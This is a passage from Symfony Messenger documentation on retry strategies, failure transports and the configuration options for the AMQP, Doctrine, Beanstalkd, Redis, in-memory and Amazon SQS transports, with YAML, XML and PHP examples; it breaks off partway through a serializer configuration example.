the container automatically between two messages, Symfony looks for any services
implementing :class:`Symfony\\Contracts\\Service\\ResetInterface` (including your
own services) and calls their ``reset()`` method so they can clean their internal state.

If a service is not stateless and you want to reset its properties after each message, then
the service must implement :class:`Symfony\\Contracts\\Service\\ResetInterface` where you can reset the
properties in the ``reset()`` method.

If you don't want to reset the container, add the ``--no-reset`` option when
running the ``messenger:consume`` command.

.. _messenger-retries-failures:

Rate Limited Transport
~~~~~~~~~~~~~~~~~~~~~~

Sometimes you might need to rate limit your message worker. You can configure a
rate limiter on a transport (requires the :doc:`RateLimiter component </rate-limiter>`)
by setting its ``rate_limiter`` option:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/messenger.yaml
        framework:
            messenger:
                transports:
                    async:
                        rate_limiter: your_rate_limiter_name

    .. code-block:: xml

        <!-- config/packages/messenger.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <framework:messenger>
                    <framework:transport name="async">
                        <option key="rate_limiter">your_rate_limiter_name</option>
                    </framework:transport>
                </framework:messenger>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/messenger.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework) {
            $framework->messenger()
                ->transport('async')
                    ->options(['rate_limiter' => 'your_rate_limiter_name'])
            ;
        };

.. caution::

    When a rate limiter is configured on a transport, it will block the whole
    worker when the limit is hit. You should make sure you configure a dedicated
    worker for a rate limited transport to avoid other transports to be blocked.

Retries & Failures
------------------

If an exception is thrown while consuming a message from a transport it will
automatically be re-sent to the transport to be tried again. By default, a message
will be retried 3 times before being discarded or
:ref:`sent to the failure transport <messenger-failure-transport>`. Each retry
will also be delayed, in case the failure was due to a temporary issue. All of
this is configurable for each transport:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/messenger.yaml
        framework:
            messenger:
                transports:
                    async_priority_high:
                        dsn: '%env(MESSENGER_TRANSPORT_DSN)%'

                        # default configuration
                        retry_strategy:
                            max_retries: 3
                            # milliseconds delay
                            delay: 1000
                            # causes the delay to be higher before each retry
                            # e.g. 1 second delay, 2 seconds, 4 seconds
                            multiplier: 2
                            max_delay: 0
                            # applies randomness to the delay that can prevent the thundering herd effect
                            # the value (between 0 and 1.0) is the percentage of 'delay' that will be added/subtracted
                            jitter: 0.1
                            # override all of this with a service that
                            # implements Symfony\Component\Messenger\Retry\RetryStrategyInterface
                            # service: null

    .. code-block:: xml

        <!-- config/packages/messenger.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <framework:messenger>
                    <framework:transport name="async_priority_high" dsn="%env(MESSENGER_TRANSPORT_DSN)%?queue_name=high_priority">
                        <framework:retry-strategy max-retries="3" delay="1000" multiplier="2" max-delay="0" jitter="0.1"/>
                    </framework:transport>
                </framework:messenger>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/messenger.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $messenger = $framework->messenger();

            $messenger->transport('async_priority_high')
                ->dsn(env('MESSENGER_TRANSPORT_DSN'))
                // default configuration
                ->retryStrategy()
                    ->maxRetries(3)
                    // milliseconds delay
                    ->delay(1000)
                    // causes the delay to be higher before each retry
                    // e.g. 1 second delay, 2 seconds, 4 seconds
                    ->multiplier(2)
                    ->maxDelay(0)
                    // applies randomness to the delay that can prevent the thundering herd effect
                    // the value (between 0 and 1.0) is the percentage of 'delay' that will be added/subtracted
                    ->jitter(0.1)
                    // override all of this with a service that
                    // implements Symfony\Component\Messenger\Retry\RetryStrategyInterface
                    ->service(null)
            ;
        };

.. versionadded:: 7.1

    The ``jitter`` option was introduced in Symfony 7.1.

.. tip::

    Symfony triggers a :class:`Symfony\\Component\\Messenger\\Event\\WorkerMessageRetriedEvent`
    when a message is retried so you can run your own logic.

.. note::

    Thanks to :class:`Symfony\\Component\\Messenger\\Stamp\\SerializedMessageStamp`,
    the serialized form of the message is saved, which prevents to serialize it
    again if the message is later retried.

Avoiding Retrying
~~~~~~~~~~~~~~~~~

Sometimes handling a message might fail in a way that you *know* is permanent
and should not be retried. If you throw
:class:`Symfony\\Component\\Messenger\\Exception\\UnrecoverableMessageHandlingException`,
the message will not be retried.

.. note::

    Messages that will not be retried, will still show up in the configured failure transport.
    If you want to avoid that, consider handling the error yourself and let the handler
    successfully end.

Forcing Retrying
~~~~~~~~~~~~~~~~

Sometimes handling a message must fail in a way that you *know* is temporary
and must be retried. If you throw
:class:`Symfony\\Component\\Messenger\\Exception\\RecoverableMessageHandlingException`,
the message will always be retried infinitely and ``max_retries`` setting will be ignored.

.. _messenger-failure-transport:

Saving & Retrying Failed Messages
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

If a message fails it is retried multiple times (``max_retries``) and then will
be discarded. To avoid this happening, you can instead configure a ``failure_transport``:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/messenger.yaml
        framework:
            messenger:
                # after retrying, messages will be sent to the "failed" transport
                failure_transport: failed

                transports:
                    # ... other transports

                    failed: 'doctrine://default?queue_name=failed'

    .. code-block:: xml

        <!-- config/packages/messenger.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <!-- after retrying, messages will be sent to the "failed" transport -->
                <framework:messenger failure-transport="failed">
                    <!-- ... other transports -->

                    <framework:transport name="failed" dsn="doctrine://default?queue_name=failed"/>
                </framework:messenger>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/messenger.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $messenger = $framework->messenger();

            // after retrying, messages will be sent to the "failed" transport
            $messenger->failureTransport('failed');

            // ... other transports

            $messenger->transport('failed')
                ->dsn('doctrine://default?queue_name=failed');
        };

In this example, if handling a message fails 3 times (default ``max_retries``),
it will then be sent to the ``failed`` transport. While you *can* use
``messenger:consume failed`` to consume this like a normal transport, you'll
usually want to manually view the messages in the failure transport and choose
to retry them:

.. code-block:: terminal

    # see all messages in the failure transport with a default limit of 50
    $ php bin/console messenger:failed:show

    # see the 10 first messages
    $ php bin/console messenger:failed:show --max=10

    # see only MyClass messages
    $ php bin/console messenger:failed:show --class-filter='MyClass'

    # see the number of messages by message class
    $ php bin/console messenger:failed:show --stats

    # see details about a specific failure
    $ php bin/console messenger:failed:show 20 -vv

    # view and retry messages one-by-one
    $ php bin/console messenger:failed:retry -vv

    # retry specific messages
    $ php bin/console messenger:failed:retry 20 30 --force

    # remove a message without retrying it
    $ php bin/console messenger:failed:remove 20

    # remove messages without retrying them and show each message before removing it
    $ php bin/console messenger:failed:remove 20 30 --show-messages

    # remove all messages in the failure transport
    $ php bin/console messenger:failed:remove --all

If the message fails again, it will be re-sent back to the failure transport
due to the normal :ref:`retry rules <messenger-retries-failures>`. Once the max
retry has been hit, the message will be discarded permanently.

Multiple Failed Transports
~~~~~~~~~~~~~~~~~~~~~~~~~~

Sometimes it is not enough to have a single, global ``failed transport`` configured
because some messages are more important than others. In those cases, you can
override the failure transport for only specific transports:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/messenger.yaml
        framework:
            messenger:
                # after retrying, messages will be sent to the "failed" transport
                # by default if no "failed_transport" is configured inside a transport
                failure_transport: failed_default

                transports:
                    async_priority_high:
                        dsn: '%env(MESSENGER_TRANSPORT_DSN)%'
                        failure_transport: failed_high_priority

                    # since no failed transport is configured, the one used will be
                    # the global "failure_transport" set
                    async_priority_low:
                        dsn: 'doctrine://default?queue_name=async_priority_low'

                    failed_default: 'doctrine://default?queue_name=failed_default'
                    failed_high_priority: 'doctrine://default?queue_name=failed_high_priority'

    .. code-block:: xml

        <!-- config/packages/messenger.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <!-- after retrying, messages will be sent to the "failed" transport
                by default if no "failed-transport" is configured inside a transport -->
                <framework:messenger failure-transport="failed_default">
                    <framework:transport name="async_priority_high" dsn="%env(MESSENGER_TRANSPORT_DSN)%" failure-transport="failed_high_priority"/>
                    <!-- since no "failed_transport" is configured, the one used will be
                    the global "failed_transport" set -->
                    <framework:transport name="async_priority_low" dsn="doctrine://default?queue_name=async_priority_low"/>

                    <framework:transport name="failed_default" dsn="doctrine://default?queue_name=failed_default"/>
                    <framework:transport name="failed_high_priority" dsn="doctrine://default?queue_name=failed_high_priority"/>
                </framework:messenger>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/messenger.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $messenger = $framework->messenger();

            // after retrying, messages will be sent to the "failed" transport
            // by default if no "failure_transport" is configured inside a transport
            $messenger->failureTransport('failed_default');

            $messenger->transport('async_priority_high')
                ->dsn(env('MESSENGER_TRANSPORT_DSN'))
                ->failureTransport('failed_high_priority');

            // since no failed transport is configured, the one used will be
            // the global failure_transport set
           $messenger->transport('async_priority_low')
                ->dsn('doctrine://default?queue_name=async_priority_low');

           $messenger->transport('failed_default')
                ->dsn('doctrine://default?queue_name=failed_default');

           $messenger->transport('failed_high_priority')
                ->dsn('doctrine://default?queue_name=failed_high_priority');
        };

If there is no ``failure_transport`` defined globally or on the transport level,
the messages will be discarded after the number of retries.

The failed commands have an optional option ``--transport`` to specify
the ``failure_transport`` configured at the transport level.

.. code-block:: terminal

    # see all messages in "failure_transport" transport
    $ php bin/console messenger:failed:show --transport=failure_transport

    # retry specific messages from "failure_transport"
    $ php bin/console messenger:failed:retry 20 30 --transport=failure_transport --force

    # remove a message without retrying it from "failure_transport"
    $ php bin/console messenger:failed:remove 20 --transport=failure_transport

.. _messenger-transports-config:

Transport Configuration
-----------------------

Messenger supports a number of different transport types, each with their own
options. Options can be passed to the transport via a DSN string or configuration.

.. code-block:: env

    # .env
    MESSENGER_TRANSPORT_DSN=amqp://localhost/%2f/messages?auto_setup=false

.. configuration-block::

    .. code-block:: yaml

        # config/packages/messenger.yaml
        framework:
            messenger:
                transports:
                    my_transport:
                        dsn: "%env(MESSENGER_TRANSPORT_DSN)%"
                        options:
                            auto_setup: false

    .. code-block:: xml

        <!-- config/packages/messenger.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <framework:messenger>
                    <framework:transport name="my_transport" dsn="%env(MESSENGER_TRANSPORT_DSN)%">
                        <framework:options auto-setup="false"/>
                    </framework:transport>
                </framework:messenger>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/messenger.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $messenger = $framework->messenger();

            $messenger->transport('my_transport')
                ->dsn(env('MESSENGER_TRANSPORT_DSN'))
                ->options(['auto_setup' => false]);
        };

Options defined under ``options`` take precedence over ones defined in the DSN.

AMQP Transport
~~~~~~~~~~~~~~

The AMQP transport uses the AMQP PHP extension to send messages to queues like
RabbitMQ. Install it by running:

.. code-block:: terminal

    $ composer require symfony/amqp-messenger

The AMQP transport DSN may looks like this:

.. code-block:: env

    # .env
    MESSENGER_TRANSPORT_DSN=amqp://guest:guest@localhost:5672/%2f/messages

    # or use the AMQPS protocol
    MESSENGER_TRANSPORT_DSN=amqps://guest:guest@localhost/%2f/messages

If you want to use TLS/SSL encrypted AMQP, you must also provide a CA certificate.
Define the certificate path in the ``amqp.cacert`` PHP.ini setting
(e.g. ``amqp.cacert = /etc/ssl/certs``) or in the ``cacert`` parameter of the
DSN (e.g ``amqps://localhost?cacert=/etc/ssl/certs/``).

The default port used by TLS/SSL encrypted AMQP is 5671, but you can overwrite
it in the ``port`` parameter of the DSN (e.g. ``amqps://localhost?cacert=/etc/ssl/certs/&port=12345``).

.. note::

    By default, the transport will automatically create any exchanges, queues and
    binding keys that are needed. That can be disabled, but some functionality
    may not work correctly (like delayed queues).
    To not autocreate any queues, you can configure a transport with ``queues: []``.

.. note::

    You can limit the consumer of an AMQP transport to only process messages
    from some queues of an exchange. See :ref:`messenger-limit-queues`.

The transport has a number of other options, including ways to configure
the exchange, queues binding keys and more. See the documentation on
:class:`Symfony\\Component\\Messenger\\Bridge\\Amqp\\Transport\\Connection`.

The transport has a number of options:

============================================  =================================================  ===================================
     Option                                   Description                                        Default
============================================  =================================================  ===================================
``auto_setup``                                Whether the exchanges and queues should be         ``true``
                                              created automatically during send / get.
``cacert``                                    Path to the CA cert file in PEM format.
``cert``                                      Path to the client certificate in PEM format.
``channel_max``                               Specifies highest channel number that the server
                                              permits. 0 means standard extension limit
``confirm_timeout``                           Timeout in seconds for confirmation; if none
                                              specified, transport will not wait for message
                                              confirmation. Note: 0 or greater seconds. May be
                                              fractional.
``connect_timeout``                           Connection timeout. Note: 0 or greater seconds.
                                              May be fractional.
``frame_max``                                 The largest frame size that the server proposes
                                              for the connection, including frame header and
                                              end-byte. 0 means standard extension limit
                                              (depends on librabbimq default frame size limit)
``heartbeat``                                 The delay, in seconds, of the connection
                                              heartbeat that the server wants. 0 means the
                                              server does not want a heartbeat. Note,
                                              librabbitmq has limited heartbeat support, which
                                              means heartbeats checked only during blocking
                                              calls.
``host``                                      Hostname of the AMQP service
``key``                                       Path to the client key in PEM format.
``login``                                     Username to use to connect the AMQP service
``password``                                  Password to use to connect to the AMQP service
``persistent``                                                                                   ``'false'``
``port``                                      Port of the AMQP service
``read_timeout``                              Timeout in for income activity. Note: 0 or
                                              greater seconds. May be fractional.
``retry``
``sasl_method``
``connection_name``                           For custom connection names (requires at least
                                              version 1.10 of the PHP AMQP extension)
``verify``                                    Enable or disable peer verification. If peer
                                              verification is enabled then the common name in
                                              the server certificate must match the server
                                              name. Peer verification is enabled by default.
``vhost``                                     Virtual Host to use with the AMQP service
``write_timeout``                             Timeout in for outcome activity. Note: 0 or
                                              greater seconds. May be fractional.
``delay[queue_name_pattern]``                 Pattern to use to create the queues                ``delay_%exchange_name%_%routing_key%_%delay%``
``delay[exchange_name]``                      Name of the exchange to be used for the            ``delays``
                                              delayed/retried messages
``queues[name][arguments]``                   Extra arguments
``queues[name][binding_arguments]``           Arguments to be used while binding the queue.
``queues[name][binding_keys]``                The binding keys (if any) to bind to this queue
``queues[name][flags]``                       Queue flags                                        ``AMQP_DURABLE``
``exchange[arguments]``                       Extra arguments for the exchange (e.g.
                                              ``alternate-exchange``)
``exchange[default_publish_routing_key]``     Routing key to use when publishing, if none is
                                              specified on the message
``exchange[flags]``                           Exchange flags                                     ``AMQP_DURABLE``
``exchange[name]``                            Name of the exchange
``exchange[type]``                            Type of exchange                                   ``fanout``
============================================  =================================================  ===================================

You can also configure AMQP-specific settings on your message by adding
:class:`Symfony\\Component\\Messenger\\Bridge\\Amqp\\Transport\\AmqpStamp` to
your Envelope::

    use Symfony\Component\Messenger\Bridge\Amqp\Transport\AmqpStamp;
    // ...

    $attributes = [];
    $bus->dispatch(new SmsNotification(), [
        new AmqpStamp('custom-routing-key', AMQP_NOPARAM, $attributes),
    ]);

.. caution::

    The consumers do not show up in an admin panel as this transport does not rely on
    ``\AmqpQueue::consume()`` which is blocking. Having a blocking receiver makes
    the ``--time-limit/--memory-limit`` options of the ``messenger:consume`` command as well as
    the ``messenger:stop-workers`` command inefficient, as they all rely on the fact that
    the receiver returns immediately no matter if it finds a message or not. The consume
    worker is responsible for iterating until it receives a message to handle and/or until one
    of the stop conditions is reached. Thus, the worker's stop logic cannot be reached if it
    is stuck in a blocking call.

.. tip::

    If your application faces socket exceptions or `high connection churn`_
    (shown by the rapid creation and deletion of connections), consider using
    `AMQProxy`_. This tool works as a gateway between Symfony Messenger and AMQP server,
    maintaining stable connections and minimizing overheads (which also improves
    the overall performance).

Doctrine Transport
~~~~~~~~~~~~~~~~~~

The Doctrine transport can be used to store messages in a database table.
Install it by running:

.. code-block:: terminal

    $ composer require symfony/doctrine-messenger

The Doctrine transport DSN may looks like this:

.. code-block:: env

    # .env
    MESSENGER_TRANSPORT_DSN=doctrine://default

The format is ``doctrine://<connection_name>``, in case you have multiple connections
and want to use one other than the "default". The transport will automatically create
a table named ``messenger_messages``.

If you want to change the default table name, pass a custom table name in the
DSN by using the ``table_name`` option:

.. code-block:: env

    # .env
    MESSENGER_TRANSPORT_DSN=doctrine://default?table_name=your_custom_table_name

Or, to create the table yourself, set the ``auto_setup`` option to ``false`` and
:ref:`generate a migration <doctrine-creating-the-database-tables-schema>`.

.. caution::

    The datetime property of the messages stored in the database uses the
    timezone of the current system. This may cause issues if multiple machines
    with different timezone configuration use the same storage.

The transport has a number of options:

==================  =====================================  ======================
Option              Description                            Default
==================  =====================================  ======================
table_name          Name of the table                      messenger_messages
queue_name          Name of the queue (a column in the     default
                    table, to use one table for
                    multiple transports)
redeliver_timeout   Timeout before retrying a message      3600
                    that's in the queue but in the
                    "handling" state (if a worker stopped
                    for some reason, this will occur,
                    eventually you should retry the
                    message) - in seconds.
auto_setup          Whether the table should be created
                    automatically during send / get.       true
==================  =====================================  ======================

.. note::

    Set ``redeliver_timeout`` to a greater value than your slowest message
    duration. Otherwise, some messages will start a second time while the
    first one is still being handled.

When using PostgreSQL, you have access to the following options to leverage
the `LISTEN/NOTIFY`_ feature. This allow for a more performant approach
than the default polling behavior of the Doctrine transport because
PostgreSQL will directly notify the workers when a new message is inserted
in the table.

=======================  ==========================================  ======================
Option                   Description                                 Default
=======================  ==========================================  ======================
use_notify               Whether to use LISTEN/NOTIFY.               true
check_delayed_interval   The interval to check for delayed           60000
                         messages, in milliseconds.
                         Set to 0 to disable checks.
get_notify_timeout       The length of time to wait for a            0
                         response when calling
                         ``PDO::pgsqlGetNotify``, in milliseconds.
=======================  ==========================================  ======================

Beanstalkd Transport
~~~~~~~~~~~~~~~~~~~~

The Beanstalkd transport sends messages directly to a Beanstalkd work queue. Install
it by running:

.. code-block:: terminal

    $ composer require symfony/beanstalkd-messenger

The Beanstalkd transport DSN may looks like this:

.. code-block:: env

    # .env
    MESSENGER_TRANSPORT_DSN=beanstalkd://localhost:11300?tube_name=foo&timeout=4&ttr=120

    # If no port, it will default to 11300
    MESSENGER_TRANSPORT_DSN=beanstalkd://localhost

The transport has a number of options:

==================  ===================================  ======================
     Option         Description                          Default
==================  ===================================  ======================
tube_name           Name of the queue                    default
timeout             Message reservation timeout          0 (will cause the
                    - in seconds.                        server to immediately
                                                         return either a
                                                         response or a
                                                         TransportException
                                                         will be thrown)
ttr                 The message time to run before it
                    is put back in the ready queue
                    - in seconds.                        90
==================  ===================================  ======================

.. _messenger-redis-transport:

Redis Transport
~~~~~~~~~~~~~~~

The Redis transport uses `streams`_ to queue messages. This transport requires
the Redis PHP extension (>=4.3) and a running Redis server (^5.0). Install it by
running:

.. code-block:: terminal

    $ composer require symfony/redis-messenger

The Redis transport DSN may looks like this:

.. code-block:: env

    # .env
    MESSENGER_TRANSPORT_DSN=redis://localhost:6379/messages
    # Full DSN Example
    MESSENGER_TRANSPORT_DSN=redis://password@localhost:6379/messages/symfony/consumer?auto_setup=true&serializer=1&stream_max_entries=0&dbindex=0
    # Redis Cluster Example
    MESSENGER_TRANSPORT_DSN=redis://host-01:6379,redis://host-02:6379,redis://host-03:6379,redis://host-04:6379
    # Unix Socket Example
    MESSENGER_TRANSPORT_DSN=redis:///var/run/redis.sock
    # TLS Example
    MESSENGER_TRANSPORT_DSN=rediss://localhost:6379/messages
    # Multiple Redis Sentinel Hosts Example
    MESSENGER_TRANSPORT_DSN=redis:?host[redis1:26379]&host[redis2:26379]&host[redis3:26379]&sentinel_master=db

A number of options can be configured via the DSN or via the ``options`` key
under the transport in ``messenger.yaml``:

=======================  =====================================  =================================
Option                   Description                            Default
=======================  =====================================  =================================
stream                   The Redis stream name                  messages
group                    The Redis consumer group name          symfony
consumer                 Consumer name used in Redis            consumer
auto_setup               Create the Redis group automatically?  true
auth                     The Redis password
delete_after_ack         If ``true``, messages are deleted      true
                         automatically after processing them
delete_after_reject      If ``true``, messages are deleted      true
                         automatically if they are rejected
lazy                     Connect only when a connection is      false
                         really needed
serializer               How to serialize the final payload     ``Redis::SERIALIZER_PHP``
                         in Redis (the
                         ``Redis::OPT_SERIALIZER`` option)
stream_max_entries       The maximum number of entries which    ``0`` (which means "no trimming")
                         the stream will be trimmed to. Set
                         it to a large enough number to
                         avoid losing pending messages
redeliver_timeout        Timeout before retrying a pending      ``3600``
                         message which is owned by an
                         abandoned consumer (if a worker died
                         for some reason, this will occur,
                         eventually you should retry the
                         message) - in seconds.
claim_interval           Interval on which pending/abandoned    ``60000`` (1 Minute)
                         messages should be checked for to
                         claim - in milliseconds
persistent_id            String, if null connection is          null
                         non-persistent.
retry_interval           Int, value in milliseconds             ``0``
read_timeout             Float, value in seconds                ``0``
                         default indicates unlimited
timeout                  Connection timeout. Float, value in    ``0``
                         seconds default indicates unlimited
sentinel_master          String, if null or empty Sentinel      null
redis_sentinel           support is disabled
=======================  =====================================  =================================

.. versionadded:: 7.1

    The option `redis_sentinel` as an alias for `sentinel_master` was introduced
    in Symfony 7.1.

.. caution::

    There should never be more than one ``messenger:consume`` command running with the same
    combination of ``stream``, ``group`` and ``consumer``, or messages could end up being
    handled more than once. If you run multiple queue workers, ``consumer`` can be set to an
    environment variable, like ``%env(MESSENGER_CONSUMER_NAME)%``, set by Supervisor
    (example below) or any other service used to manage the worker processes.
    In a container environment, the ``HOSTNAME`` can be used as the consumer name, since
    there is only one worker per container/host. If using Kubernetes to orchestrate the
    containers, consider using a ``StatefulSet`` to have stable names.

.. tip::

    Set ``delete_after_ack`` to ``true`` (if you use a single group) or define
    ``stream_max_entries`` (if you can estimate how many max entries is acceptable
    in your case) to avoid memory leaks. Otherwise, all messages will remain
    forever in Redis.

In Memory Transport
~~~~~~~~~~~~~~~~~~~

The ``in-memory`` transport does not actually deliver messages. Instead, it
holds them in memory during the request, which can be useful for testing.
For example, if you have an ``async_priority_normal`` transport, you could
override it in the ``test`` environment to use this transport:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/test/messenger.yaml
        framework:
            messenger:
                transports:
                    async_priority_normal: 'in-memory://'

    .. code-block:: xml

        <!-- config/packages/test/messenger.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <framework:messenger>
                    <framework:transport name="async_priority_normal" dsn="in-memory://"/>
                </framework:messenger>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/test/messenger.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $messenger = $framework->messenger();

            $messenger->transport('async_priority_normal')
                ->dsn('in-memory://');
        };

Then, while testing, messages will *not* be delivered to the real transport.
Even better, in a test, you can check that exactly one message was sent
during a request::

    // tests/Controller/DefaultControllerTest.php
    namespace App\Tests\Controller;

    use Symfony\Bundle\FrameworkBundle\Test\WebTestCase;
    use Symfony\Component\Messenger\Transport\InMemory\InMemoryTransport;

    class DefaultControllerTest extends WebTestCase
    {
        public function testSomething(): void
        {
            $client = static::createClient();
            // ...

            $this->assertSame(200, $client->getResponse()->getStatusCode());

            /* @var InMemoryTransport $transport */
            $transport = $this->getContainer()->get('messenger.transport.async_priority_normal');
            $this->assertCount(1, $transport->getSent());
        }
    }

The transport has a number of options:

``serialize`` (boolean, default: ``false``)
    Whether to serialize messages or not. This is useful to test an additional
    layer, especially when you use your own message serializer.

.. note::

    All ``in-memory`` transports will be reset automatically after each test **in**
    test classes extending
    :class:`Symfony\\Bundle\\FrameworkBundle\\Test\\KernelTestCase`
    or :class:`Symfony\\Bundle\\FrameworkBundle\\Test\\WebTestCase`.

Amazon SQS
~~~~~~~~~~

The Amazon SQS transport is perfect for applications hosted on AWS. Install it by
running:

.. code-block:: terminal

    $ composer require symfony/amazon-sqs-messenger

The SQS transport DSN may looks like this:

.. code-block:: env

    # .env
    MESSENGER_TRANSPORT_DSN=https://sqs.eu-west-3.amazonaws.com/123456789012/messages?access_key=AKIAIOSFODNN7EXAMPLE&secret_key=j17M97ffSVoKI0briFoo9a
    MESSENGER_TRANSPORT_DSN=sqs://localhost:9494/messages?sslmode=disable

.. note::

    The transport will automatically create queues that are needed. This
    can be disabled by setting the ``auto_setup`` option to ``false``.

.. tip::

    Before sending or receiving a message, Symfony needs to convert the queue
    name into an AWS queue URL by calling the ``GetQueueUrl`` API in AWS. This
    extra API call can be avoided by providing a DSN which is the queue URL.

The transport has a number of options:

======================  ======================================  ===================================
     Option             Description                             Default
======================  ======================================  ===================================
``access_key``          AWS access key                          must be urlencoded
``account``             Identifier of the AWS account           The owner of the credentials
``auto_setup``          Whether the queue should be created     ``true``
                        automatically during send / get.
``buffer_size``         Number of messages to prefetch          9
``debug``               If ``true`` it logs all HTTP requests   ``false``
                        and responses (it impacts performance)
``endpoint``            Absolute URL to the SQS service         https://sqs.eu-west-1.amazonaws.com
``poll_timeout``        Wait for new message duration in        0.1
                        seconds
``queue_name``          Name of the queue                       messages
``region``              Name of the AWS region                  eu-west-1
``secret_key``          AWS secret key                          must be urlencoded
``session_token``       AWS session token
``visibility_timeout``  Amount of seconds the message will      Queue's configuration
                        not be visible (`Visibility Timeout`_)
``wait_time``           `Long polling`_ duration in seconds     20
======================  ======================================  ===================================

.. note::

    The ``wait_time`` parameter defines the maximum duration Amazon SQS should
    wait until a message is available in a queue before sending a response.
    It helps reducing the cost of using Amazon SQS by eliminating the number
    of empty responses.

    The ``poll_timeout`` parameter defines the duration the receiver should wait
    before returning null. It avoids blocking other receivers from being called.

.. note::

    If the queue name is suffixed by ``.fifo``, AWS will create a `FIFO queue`_.
    Use the stamp :class:`Symfony\\Component\\Messenger\\Bridge\\AmazonSqs\\Transport\\AmazonSqsFifoStamp`
    to define the ``Message group ID`` and the ``Message deduplication ID``.

    Another possibility is to enable the
    :class:`Symfony\\Component\\Messenger\\Bridge\\AmazonSqs\\Middleware\\AddFifoStampMiddleware`.
    If your message implements
    :class:`Symfony\\Component\\Messenger\\Bridge\\AmazonSqs\\MessageDeduplicationAwareInterface`,
    the middleware will automatically add the
    :class:`Symfony\\Component\\Messenger\\Bridge\\AmazonSqs\\Transport\\AmazonSqsFifoStamp`
    and set the ``Message deduplication ID``. Additionally, if your message implements the
    :class:`Symfony\\Component\\Messenger\\Bridge\\AmazonSqs\\MessageGroupAwareInterface`,
    the middleware will automatically set the ``Message group ID`` of the stamp.

    You can learn more about middlewares in
    :ref:`the dedicated section <messenger_middleware>`.

    FIFO queues don't support setting a delay per message, a value of ``delay: 0``
    is required in the retry strategy settings.

Serializing Messages
~~~~~~~~~~~~~~~~~~~~

When messages are sent to (and received from) a transport, they're serialized
using PHP's native ``serialize()`` & ``unserialize()`` functions. You can change
this globally (or for each transport) to a service that implements
:class:`Symfony\\Component\\Messenger\\Transport\\Serialization\\SerializerInterface`:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/messenger.yaml
        framework:
            messenger:
                serializer:
                    default_serializer: messenger.transport.symfony_serializer
                    symfony_serializer:
                        format: json
                        context: { }

                transports:
                    async_priority_normal:
                        dsn: # ...
                        serializer: messenger.transport.symfony_serializer

    .. code-block:: xml

        <!-- config/packages/messenger.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <framework:messenger>
                    <framework:serializer default-serializer="messenger.transport.symfony_serializer">
